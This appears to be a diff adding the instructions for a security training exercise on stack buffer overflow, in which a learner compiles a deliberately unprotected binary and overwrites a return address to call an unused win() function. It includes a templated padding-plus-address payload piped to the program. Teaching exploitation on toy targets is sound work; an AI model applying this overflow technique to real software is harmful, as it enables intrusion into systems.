@@ -1,0 +1,20 @@
+Exercise 01 — Return-Oriented Hijacking
+========================================
+
+A program reads your input from stdin.
+It copies it into a small stack buffer with no bounds check.
+The function win() exists in the binary but is never called.
+
+Your goal: make win() execute.
+
+  Compile:
+    gcc -fno-stack-protector -no-pie -o target target.c
+
+  Find the address of win():
+    nm target | grep win
+
+  Send your payload via stdin:
+    python3 -c "import sys, struct
+    sys.stdout.buffer.write(b'A' * PADDING + struct.pack('<Q', ADDRESS))" | ./target
+
+When you see [SUCCESS], run `horizon done`.
